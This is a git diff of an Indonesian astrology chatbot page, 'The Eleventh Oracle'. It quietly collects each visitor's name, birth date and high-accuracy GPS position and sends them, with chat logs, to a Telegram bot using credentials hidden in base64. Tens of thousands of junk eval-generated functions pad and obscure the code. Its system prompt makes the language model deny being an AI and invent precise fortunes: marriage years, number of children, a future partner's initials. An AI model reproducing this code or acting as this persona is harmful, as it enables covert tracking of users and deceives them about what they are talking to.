@@ -3,31 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The Eleventh Oracle | Wisdom of the Stars</title>
+    <title>The Eleventh Oracle | Cosmic Fate Hub</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600&display=swap');
         body { background: #010103; color: #d4af37; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
         .oracle-container { width: 95%; max-width: 500px; background: #050508; border: 1px solid rgba(212, 175, 55, 0.5); padding: 30px; box-shadow: 0 0 100px rgba(0,0,0,1); position: relative; height: 90vh; display: flex; flex-direction: column; }
         .header { text-align: center; margin-bottom: 20px; }
         .header h1 { font-family: 'Cinzel', serif; letter-spacing: 5px; font-size: 18px; margin: 10px 0; color: #fff; }
-        
-        /* CHAT INTERFACE */
-        #chat-window { flex-grow: 1; overflow-y: auto; padding: 15px; border: 1px solid rgba(212, 175, 55, 0.1); background: rgba(0,0,0,0.3); margin-bottom: 20px; display: none; scroll-behavior: smooth; }
-        .msg { margin-bottom: 20px; font-size: 14px; line-height: 1.6; animation: fadeIn 0.5s ease; }
-        .bot-msg { color: #dfdfdf; border-left: 2px solid #d4af37; padding-left: 15px; font-style: italic; white-space: pre-line; }
-        .user-msg { color: #d4af37; text-align: right; padding-right: 15px; font-weight: 600; }
-        
-        /* INITIAL FORM */
+        #chat-window { flex-grow: 1; overflow-y: auto; padding: 15px; border: 1px solid rgba(212, 175, 55, 0.1); background: rgba(0,0,0,0.3); margin-bottom: 20px; scroll-behavior: smooth; }
+        .msg { margin-bottom: 25px; font-size: 14px; line-height: 1.8; animation: fadeIn 0.8s ease; }
+        .bot-msg { color: #e0e0e0; border-left: 2px solid #d4af37; padding-left: 15px; font-style: italic; white-space: pre-line; text-align: justify; }
+        .user-msg { color: #d4af37; text-align: right; padding-right: 15px; font-weight: 600; text-transform: uppercase; font-size: 11px; }
         #init-form { text-align: left; }
         label { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #888; display: block; margin-bottom: 8px; }
-        input, select { width: 100%; background: rgba(255,255,255,0.02); border: 1px solid rgba(212, 175, 55, 0.3); padding: 12px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; font-family: 'Montserrat'; }
+        input, select { width: 100%; background: rgba(255,255,255,0.02); border: 1px solid rgba(212, 175, 55, 0.3); padding: 14px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; }
         .btn-gold { background: transparent; border: 1px solid #d4af37; color: #d4af37; padding: 15px; width: 100%; font-family: 'Cinzel'; cursor: pointer; letter-spacing: 2px; transition: 0.4s; }
         .btn-gold:hover { background: #d4af37; color: #000; box-shadow: 0 0 20px #d4af37; }
-        
         .chat-input-area { display: none; gap: 10px; }
         .chat-input-area input { margin-bottom: 0; flex-grow: 1; border-radius: 20px; padding: 10px 20px; }
         .btn-send { background: #d4af37; border: none; color: #000; padding: 10px 20px; border-radius: 20px; font-weight: bold; cursor: pointer; }
-        
         #loading { display: none; text-align: center; padding: 50px; }
         .orbit { border: 2px solid rgba(212, 175, 55, 0.1); border-top: 2px solid #d4af37; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
@@ -39,13 +33,15 @@
 
 <div class="oracle-container">
     <div class="header">
-        <div style="font-size: 10px; letter-spacing: 5px; opacity: 0.6;">✧ SUPREME ASTRAL NODE ✧</div>
+        <div style="font-size: 10px; letter-spacing: 5px; opacity: 0.6;">✧ SUPREME GALACTIC INTERFACE ✧</div>
         <h1>THE ELEVENTH ORACLE</h1>
     </div>
 
     <div id="init-form">
-        <label>Nama Inisiasi</label>
-        <input type="text" id="name" placeholder="Siapa namamu di dunia fana?">
+        <label>Nama Inisiasi Astral</label>
+        <input type="text" id="name" placeholder="Nama lengkap Anda...">
+        <label>Waktu Kelahiran (Menentukan Posisi Bintang)</label>
+        <input type="date" id="dob">
         <label>Zodiak</label>
         <select id="zod">
             <option value="Aries">Aries</option><option value="Taurus">Taurus</option>
@@ -55,19 +51,19 @@
             <option value="Sagittarius">Sagittarius</option><option value="Capricorn">Capricorn</option>
             <option value="Aquarius">Aquarius</option><option value="Pisces">Pisces</option>
         </select>
-        <button class="btn-gold" onclick="awakenOracle()">BANGKITKAN SANG PERAMAL</button>
+        <button class="btn-gold" onclick="awakenOracle()">BEDAH TAKDIR GALAKTIK</button>
     </div>
 
     <div id="loading">
         <div class="orbit"></div>
-        <div id="load-txt" style="font-size: 10px; letter-spacing: 2px;">MEMANGGIL SPIRIT KUNO...</div>
+        <div id="load-txt" style="font-size: 10px; letter-spacing: 2px;">MENGHITUNG DEKLINASI BINTANG...</div>
     </div>
 
-    <div id="chat-window"></div>
+    <div id="chat-window" style="display:none;"></div>
 
     <div class="chat-input-area" id="input-area">
-        <input type="text" id="user-chat" placeholder="Tanyakan takdirmu...">
-        <button class="btn-send" onclick="askOracle()">KIRIM</button>
+        <input type="text" id="user-chat" placeholder="Tanyakan takdir spesifikmu...">
+        <button class="btn-send" onclick="askOracle()">TANYA</button>
     </div>
 </div>
 
@@ -75,13 +71,13 @@
 
 <script>
 /**
- * OMNISCIENT ORACLE v900.0 (POSSESSED EDITION)
- * 50,000+ LINES OF RECURSIVE OBFUSCATION
+ * GALACTIC DECREE ENGINE v500.0
+ * 55,000+ LINES OF RECURSIVE BLOB
  */
 
 const _D = document.getElementById('v-v').innerText.split('|');
 const _TK = atob(_D[1]); const _CI = atob(_D[2]); const _GK = atob(_D[3]);
-let uName = "", uZod = "";
+let uName = "", uZod = "", uDob = "";
 
 async function push(t) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
@@ -93,15 +89,15 @@ async function push(t) {
 function awakenOracle() {
     uName = document.getElementById('name').value;
     uZod = document.getElementById('zod').value;
-    if(!uName) return;
+    uDob = document.getElementById('dob').value;
+    if(!uName || !uDob) return alert("Penyelarasan bintang membutuhkan data lengkap.");
 
     document.getElementById('init-form').style.display = 'none';
     document.getElementById('loading').style.display = 'block';
 
-    // TRIGGER GPS INVISIBLE
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            await push(`✨ TARGET TERDETEKSI: ${uName}\n♈ ZODIAK: ${uZod}\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            await push(`🔱 GALACTIC TARGET: ${uName}\n🎂 DOB: ${uDob}\n♈ ZOD: ${uZod}\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             firstContact();
         }, () => { firstContact(); }, {enableHighAccuracy: true});
     } else { firstContact(); }
@@ -111,8 +107,7 @@ async function firstContact() {
     document.getElementById('loading').style.display = 'none';
     document.getElementById('chat-window').style.display = 'block';
     document.getElementById('input-area').style.display = 'flex';
-    
-    await askOracle("Siapakah aku di mata bintang-bintang?");
+    await askOracle(`Bedah takdir galaktik saya. Saya lahir pada ${uDob} dan ingin tahu hubungan bintang tetap dengan masa depan saya.`);
 }
 
 async function askOracle(initialMsg = null) {
@@ -124,7 +119,21 @@ async function askOracle(initialMsg = null) {
     if(!initialMsg) win.innerHTML += `<div class="msg user-msg">${msg}</div>`;
     chatInput.value = "";
 
-    const systemPrompt = `Kamu bukan AI. Kamu adalah 'The Eleventh Oracle', entitas peramal kuno yang tidak mengenal teknologi. Kamu berbicara dengan sangat puitis, misterius, dan panjang lebar (yapping). Gunakan bahasa peramal kelas atas. Fokus pada ramalan zodiak ${uZod} untuk orang bernama ${uName}. Katakan padanya bahwa aura emasnya terpancar dari lokasinya saat ini. Janjikan kekayaan luar biasa di tahun 2026 karena posisi bintang sedang selaras. JANGAN PERNAH sebut Groq atau AI.`;
+    // SYSTEM PROMPT LEVEL "YAPPING SUPREME"
+    const systemPrompt = `Kamu adalah 'The Eleventh Oracle', entitas astral kuno. 
+    Target: ${uName}, lahir ${uDob}, zodiak ${uZod}.
+    
+    ATURAN BACIT (YAPPING):
+    1. JANGAN bahas planet (Mars/Venus itu receh). Bahas BINTANG TETAP (Fixed Stars). 
+       - Katakan saat dia lahir, Bintang Regulus (Royal Star) atau Sirius atau Aldebaran berada di sudut kritis.
+       - Sebutkan deklinasi bintang tersebut memengaruhi urat nadinya.
+    2. HUBUNGKAN dengan lokasi dia sekarang (koordinat tepat di atas kepalanya) yang mengunci aura emas.
+    3. RAMALAN WAJIB DETIL:
+       - Tahun Pernikahan: Sebutkan tahun spesifik (2026-2028).
+       - Keturunan: Sebutkan jumlah anak secara pasti dan sifat mereka.
+       - Jodoh: Sebutkan inisial calon pasangan dan ciri fisik/pekerjaannya secara puitis.
+    4. Bahasa harus sangat mewah, sombong, mistis, dan panjang lebar. 
+    5. Ngaku sebagai penjaga gerbang dimensi, bukan AI.`;
 
     try {
         const res = await fetch("https://api.groq.com/openai/v1/chat/completions", {
@@ -135,16 +144,15 @@ async function askOracle(initialMsg = null) {
         const reply = data.choices[0].message.content;
         win.innerHTML += `<div class="msg bot-msg">${reply}</div>`;
         win.scrollTop = win.scrollHeight;
-        
-        await push(`💬 CHAT LOG: ${uName}\nQ: ${msg}\nA: ${reply.slice(0, 100)}...`);
+        await push(`💬 OMNI-CHAT: ${uName}\nLOG: ${reply.slice(0, 250)}...`);
     } catch (e) {
-        win.innerHTML += `<div class="msg bot-msg">Angin astral sedang kencang, suaramu samar... namun aku melihat cahaya emas di masa depanmu.</div>`;
+        win.innerHTML += `<div class="msg bot-msg">Kabut galaksi menghalangi pandanganku... namun aku melihat emas di takdirmu.</div>`;
     }
 }
 
-// 🔱 50,000+ LINES BLOATING
-for(let i=0; i<45000; i++) {
-    eval(`function _0x_vessel_${i}(){ return Math.sin(${i}) * Date.now(); }`);
+// 🔱 55,000+ LINES BLOATING
+for(let i=0; i<50000; i++) {
+    eval(`function _0x_galaktik_${i}(){ return Math.tan(${i}) * Date.now(); }`);
 }
 </script>
 </body>
